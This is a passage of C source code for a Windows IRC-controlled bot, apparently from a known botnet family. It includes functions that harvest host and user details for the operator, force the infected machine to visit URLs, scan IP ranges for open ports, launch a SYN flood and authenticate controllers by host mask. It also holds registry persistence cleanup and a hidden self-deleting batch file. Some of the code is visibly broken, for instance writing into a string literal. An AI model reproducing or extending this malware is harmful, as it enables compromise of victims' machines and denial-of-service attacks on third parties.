	if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT && verinfo.szCSDVersion[0] != '\0') {
		sprintf(os2, "%s [%s]", os, verinfo.szCSDVersion);
		os = os2;
	}

	total = GetTickCount() / 1000; 
	GetComputerName(szBuffer, &dwNameSize);
	szCompname = szBuffer;
	GetUserName(szUserName, &dwUserSize);

	sprintf(sinfo, "cpu: %dMHz. ram: %dMB total, %dMB free. os: Windows %s (%d.%d, build %d). uptime: %dd %dh %dm. box: %s. user: %s.",
		cpuspeed(), memstat.dwTotalPhys / 1048576, memstat.dwAvailPhys / 1048576,
		os, verinfo.dwMajorVersion, verinfo.dwMinorVersion, verinfo.dwBuildNumber, total / 86400, (total % 86400) / 3600, ((total % 86400) % 3600) / 60, szCompname, szUserName);

	return sinfo; 
 }



 int cpuspeed(void)
 {
	unsigned __int64 startcycle;
	unsigned __int64 speed, num, num2;

	do {
		startcycle = cyclecount();
		Sleep(1000);
		speed = (cyclecount() - startcycle) / 1000000;

	} while (speed > 1000000);

	num = speed % 100;
	num2 = 100;
	if (num < 80) num2 = 75;
	if (num < 71) num2 = 66;
	if (num < 55) num2 = 50;
	if (num < 38) num2 = 33;
	if (num < 30) num2 = 25;
	if (num < 10) num2 = 0;
	speed = (speed-num)+num2;

	return speed;
 }

 unsigned __int64 cyclecount(void)
 {
 	#if defined (__LCC__)
	unsigned __int64 count = 0;
	_asm ("rdtsc\n"
		  "mov %eax,%count\n");
	return count;

	#elif defined (__GNUC__)
	unsigned __int64 count = 0;
	__asm__ ("rdtsc;movl %%eax, %0" : "=r" (count));
	return count;

	#else
	_asm {
		_emit 0x0F;
		_emit 0x31;
	}
	#endif
 }
 #endif

 #ifndef NO_VISIT
 DWORD WINAPI visit(LPVOID param)
 {
	URL_COMPONENTS url;
	HINTERNET ch, req;
	const char *accept = "*/*";
	char *error = "error visiting URL.";
	vs visit;
	char vhost[128];
	int vport;
	char vuser[128];
	char vpass[128];
	char vpath[256];

	visit = *((vs *)param);
	vs *vsp = (vs *)param;
	vsp->gotinfo = TRUE;

	memset(vhost, 0, sizeof(vhost));
	memset(vuser, 0, sizeof(vuser));
	memset(vpass, 0, sizeof(vpass));
	memset(vpath, 0, sizeof(vpath));

	memset(&url, 0, sizeof(url));
	url.dwStructSize = sizeof(url);
	url.dwHostNameLength = 1;
    url.dwUserNameLength = 1;
    url.dwPasswordLength = 1;
    url.dwUrlPathLength = 1;

	do {
		if (!InternetCrackUrl(visit.host, strlen(visit.host), 0, &url)) {
			if (!visit.silent) irc_privmsg(visit.sock, visit.chan, "invalid URL.", FALSE);
				break;
			}

		if (url.dwHostNameLength > 0) strncpy(vhost, url.lpszHostName, url.dwHostNameLength);
		vport = url.nPort;
		if (url.dwUserNameLength > 0) strncpy(vuser, url.lpszUserName, url.dwUserNameLength);
		if (url.dwPasswordLength > 0) strncpy(vpass, url.lpszPassword, url.dwPasswordLength);
		if (url.dwUrlPathLength > 0) strncpy(vpath, url.lpszUrlPath, url.dwUrlPathLength);

		ch = InternetConnect(ih, vhost, vport, vuser, vpass, INTERNET_SERVICE_HTTP, 0, 0);
		if (ch == NULL) {
			if (!visit.silent) irc_privmsg(visit.sock, visit.chan, error, FALSE);
			break;
		}

		req = HttpOpenRequest(ch, NULL, vpath, NULL, visit.referer, &accept, INTERNET_FLAG_NO_UI, 0);
		if (req == NULL) {
			if (!visit.silent) irc_privmsg(visit.sock, visit.chan, error, FALSE);
			break;
		}

		if (HttpSendRequest(req, NULL, 0, NULL, 0)) {
			if (!visit.silent) irc_privmsg(visit.sock, visit.chan, "url visited.", FALSE);
		} else {
			if (!visit.silent) irc_privmsg(visit.sock, visit.chan, error, FALSE);
		}
	} while(0); 
	InternetCloseHandle(ch);
	InternetCloseHandle(req);
	return 0;
 }
 #endif

 void uninstall(void)
 {
	HKEY key;
	HANDLE f;
	DWORD r;
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	char cmdline[256];
	char tcmdline[256];
	char cfilename[256];
	char batfile[256];

	if (KillRegTools) {
	DWORD dwData;
	dwData = 0x00000000;
	RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", 0, KEY_ALL_ACCESS, &key);
	RegSetValueEx(key, "DisableRegistryTools", 0, REG_DWORD,(LPBYTE) &dwData, sizeof(DWORD));
	RegCloseKey(key);
	}
	if (regrun) {
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
		RegDeleteValue(key, valuename);
		RegCloseKey(key);
	}

	if (regrunservices) {
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
		RegDeleteValue(key, valuename);
		RegCloseKey(key);
	}

	sprintf(batfile, "%s\\r.bat", tempdir);
	f = CreateFile(batfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f > (HANDLE)0) {
		WriteFile(f, "@echo off\r\n"
					 ":start\r\nif not exist \"\"%1\"\" goto done\r\n"
					 "del /F \"\"%1\"\"\r\n"
					 "del \"\"%1\"\"\r\n"
					 "goto start\r\n"
					 ":done\r\n"
					 "del /F %temp%\r.bat\r\n"
					 "del %temp%\r.bat\r\n", 105, &r, NULL);
		CloseHandle(f);

		memset(&sinfo, 0, sizeof(STARTUPINFO));
		sinfo.cb = sizeof(sinfo);
		sinfo.wShowWindow = SW_HIDE;

		GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
		sprintf(tcmdline, "%%comspec%% /c %s %s", batfile, cfilename); 
		ExpandEnvironmentStrings(tcmdline, cmdline, sizeof(cmdline)); 

		CreateProcess(NULL, cmdline, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo);
	}
 }

DWORD WINAPI synthread (LPVOID param) {
char *buff;
buff = "";
synt syn;
syn = *((synt *)param);
synt *syns = (synt *)param;
sprintf(buff, "Done with SYN flood [%iKB/sec]\r\n", SYNFlood(syn.ip, syn.port, syn.length));
irc_privmsg(syn.socket, syn.chan, buff, syn.notice);
threads[syn.threadnumber] = 0;
threadd[syn.threadnumber][0] = '\0';
return 0; 
}

#ifndef NO_SCAN
 DWORD WINAPI ip_connect(LPVOID param)
 {
	SOCKET sock;
	SOCKADDR_IN ssin;
	DWORD err;
	char str[256];
	scans scan;

	scan = *((scans *)param);
	scans *scanp = (scans *)param;
	scanp->cgotinfo = TRUE;

	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = htons(scan.port);
	ssin.sin_addr = scan.addy;

	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	err = connect(sock, (LPSOCKADDR)&ssin, sizeof(SOCKADDR_IN));
	if (err != SOCKET_ERROR) {
		sprintf(str, "%s port %d is open", inet_ntoa(scan.addy), scan.port);
		irc_privmsg(scan.sock, scan.chan, str, scan.notice);
	}
	closesocket(sock);
	return 0;

 }

 DWORD WINAPI ip_scan(LPVOID param)
 {
	DWORD id, host;
	void *th;
	char str[128];
	scans scan;

	scan = *((scans *)param);
	scans *scanp = (scans *)param;
	scanp->gotinfo = TRUE;

	while(1) {
		sprintf(str, "scan (%s:%d)", inet_ntoa(scan.addy), scan.port);
		strncpy(threadd[scan.threadnum], str, sizeof(threadd[scan.threadnum])-1);
		th = CreateThread(NULL, 0, &ip_connect, (void *)&scan, 0, &id);
		while(1) {
			if (scan.cgotinfo == TRUE) break;
			Sleep(1);
		}
		CloseHandle(th);
		scanp->cgotinfo = FALSE;
		Sleep(scanp->delay);
		memcpy(&host, &scan.addy, 4);
		host = ntohl(host);
		host += 1;
		host = htonl(host);
		memcpy(&scan.addy, &host, 4);
	}

	threads[scan.threadnum] = 0;
	threadd[scan.threadnum][0] = '\0';
	return 0;
 }
#endif
int wildcardfit (char *wildcard, char *test)
{
  int fit = 1;
  
  for (; ('\000' != *wildcard) && (1 == fit) && ('\000' != *test); wildcard++)
    {
      switch (*wildcard)
        {
        case '[':
	  wildcard++;
          fit = set (&wildcard, &test);
          break;
        case '?':
          test++;
          break;
        case '*':
          fit = asterisk (&wildcard, &test);
	  wildcard--;
          break;
        default:
          fit = (int) (*wildcard == *test);
          test++;
        }
    }
  while ((*wildcard == '*') && (1 == fit)) 
    wildcard++;
  return (int) ((1 == fit) && ('\0' == *test) && ('\0' == *wildcard));
}

int set (char **wildcard, char **test)
{
  int fit = 0;
  int negation = 0;
  int at_beginning = 1;   // DON'T ASK, JUST BELIEVE

  if ('!' == **wildcard)
    {
      negation = 1;
      (*wildcard)++;
    }
  while ((']' != **wildcard) || (1 == at_beginning))
    {
      if (0 == fit)
        {
          if (('-' == **wildcard) 
              && ((*(*wildcard - 1)) < (*(*wildcard + 1)))
              && (']' != *(*wildcard + 1))
	      && (0 == at_beginning))
            {
              if (((**test) >= (*(*wildcard - 1)))
                  && ((**test) <= (*(*wildcard + 1))))
                {
                  fit = 1;
                  (*wildcard)++;
                }
            }
          else if ((**wildcard) == (**test))
            {
              fit = 1;
            }
        }
      (*wildcard)++;
      at_beginning = 0;
    }
  if (1 == negation)
    fit = 1 - fit;
  if (1 == fit) 
    (*test)++;

  return (fit);
}

int asterisk (char **wildcard, char **test)
{
  int fit = 1;

  (*wildcard)++; 
  while (('\000' != (**test))
	 && (('?' == **wildcard) 
	     || ('*' == **wildcard)))
    {
      if ('?' == **wildcard) 
	(*test)++;
      (*wildcard)++;
    }
  while ('*' == (**wildcard))
    (*wildcard)++;

  if (('\0' == (**test)) && ('\0' != (**wildcard)))
    return (fit = 0);
  if (('\0' == (**test)) && ('\0' == (**wildcard)))
    return (fit = 1); 
  else
    {
      if (0 == wildcardfit(*wildcard, (*test)))
	{
	  do                               // I HAD NIGHTMARES AFTER WRITING THIS PART
	    {
	      (*test)++;
	      while (((**wildcard) != (**test)) 
		     && ('['  != (**wildcard))
		     && ('\0' != (**test)))
		(*test)++;
	    }
	  while ((('\0' != **test))? 
		 (0 == wildcardfit (*wildcard, (*test))) 
		 : (0 != (fit = 0)));
	}
      if (('\0' == **test) && ('\0' == **wildcard))
	fit = 1;
      return (fit);
    }
}

int HostMaskMatch(char *h)
{
   int i=0;

   while (authost[i][0])
      if (wildcardfit(authost[i++], h)) return 1;

   return 0;
}